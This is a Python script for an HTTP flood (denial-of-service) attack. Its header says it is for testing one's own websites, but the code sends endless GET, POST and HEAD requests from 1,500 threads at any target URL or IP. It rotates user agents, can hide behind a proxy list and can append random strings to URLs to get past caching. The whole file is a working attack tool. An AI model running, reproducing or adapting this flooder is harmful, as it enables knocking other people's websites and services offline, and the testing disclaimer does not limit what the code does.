# -*- coding: utf-8 -*-
# Script created for testing your own websites
# by Alexey Privalov | www.alex0007.ru
import os

#import threading
import concurrent.futures
import http.client
import urllib.parse
import random
import sys
import string



referrer = ""
request_methods = ["GET", "POST", "HEAD"]
thread_limit = 1500
append_rand_string_to_url = False
min_timeout = 30
max_timeout = 30
wait_for_response = True
cookie = ""  # name1=value1; name2=value2

user_agents = []  # in file 'useragents.txt'
proxies = []  # in file 'proxies.txt' if none - attack directly
url = []  # from file 'urls.txt' or enter manually
target = None
cur_header = None

def read_data():
    global proxies, user_agents, url, cur_header
    make_dir('settings')
    user_agents = read_useragents()
    proxies = read_proxies()
    url = read_urls()
    cur_header = set_header()

def set_header():
    global cookie
    cur_header = {
    "User-agent": random.choice(user_agents),
    "Referrer": referrer,
    "Accept-Encoding": "gzip, deflate",
    "Connection": "Keep-Alive",
    "Cookie": cookie}
    return cur_header

def read_file_to_array(file_desc):
    file_desc.seek(0)
    array = [line.strip() for line in file_desc]
    return array

def read_useragents():
    file = open("settings/useragents.txt", "a+")
    user_agents = read_file_to_array(file)
    if len(user_agents) == 0:
        def_user_agent = 'Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36'
        user_agents.append(
            def_user_agent)
        file.write(
            def_user_agent)
    file.close()
    return user_agents


def read_urls():
    global url, target
    file = open("settings/urls.txt", "a+")
    url = read_file_to_array(file)
    if len(url) == 0 and __name__ == '__main__':
        print('Enter target url or IP ( e.g. "http://google.com/" or "http://195.208.0.133/"):')
        target = input()
        url.append(target)
    file.close()
    return url

def read_proxies():
    file = open("settings/proxies.txt", "a+")
    proxies = read_file_to_array(file)
    file.close()
    return proxies


def make_dir(dirname):
    try:
        os.makedirs(dirname)
    except:
        pass



def start_flood():
    global thread_limit
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_limit) as executor:
        while True:
            future_to_url = {executor.submit(flood)}



def flood():
    global url, proxies, min_timeout, max_timeout, append_rand_string_to_url, request_methods, cur_header, wait_for_response
    try:
        cur_url = urllib.parse.urlparse(random.choice(url))
        if len(proxies) == 0:  # setting direct connection here
            connection = http.client.HTTPConnection(cur_url.netloc, timeout=random.randint(min_timeout,
                                                                                           max_timeout))
            url_str = cur_url.path + cur_url.params + cur_url.query
        else:  # connect via random proxy
            connection = http.client.HTTPConnection(random.choice(proxies))
            url_str = cur_url.scheme + '://' + cur_url.netloc + cur_url.path + cur_url.params + cur_url.query
        while True:
            if not append_rand_string_to_url:
                connection.request(method=random.choice(request_methods), url=url_str,
                                   headers=cur_header)
            else:
                randstr = ''.join(random.choice(string.ascii_uppercase + string.digits) for x in range(5))
                connection.request(method=random.choice(request_methods), url=url_str + randstr,
                                   headers=cur_header)
            if wait_for_response:
                connection.getresponse().read()

    except:
        pass


if __name__ == '__main__':
    read_data()
    target = urllib.parse.urlparse(random.choice(url))
    print(str(len(user_agents)) + ' user agents detected')
    print(str(len(url)) + ' urls detected')
    print(str(len(proxies)) + ' proxies detected')
    print(str(thread_limit) + ' threads')
    print("Flooding %s" % target.netloc)

    start_flood()
